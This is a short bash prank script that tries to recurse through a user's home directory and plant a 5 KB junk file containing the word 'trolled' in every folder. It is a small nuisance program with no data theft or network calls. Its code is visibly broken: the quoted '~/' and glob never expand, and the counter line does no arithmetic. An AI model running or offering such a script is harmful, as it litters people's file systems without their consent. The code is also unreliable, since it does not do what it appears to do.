#!/bin/bash

total_filled=0

function make_file {
	touch "$1"
	truncate -s 41 "$1"
	echo -n "trolled" >> "$1"
	truncate -s $(expr 1024 '*' 5) "$1"
}

function fill_folder {
	make_file "$1$RANDOM"
	total_filled=total_filled+1
	for d in "$1*/" ; do
		fill_folder "$1$d"
	done
}

fill_folder "~/"
echo "$total_filled"
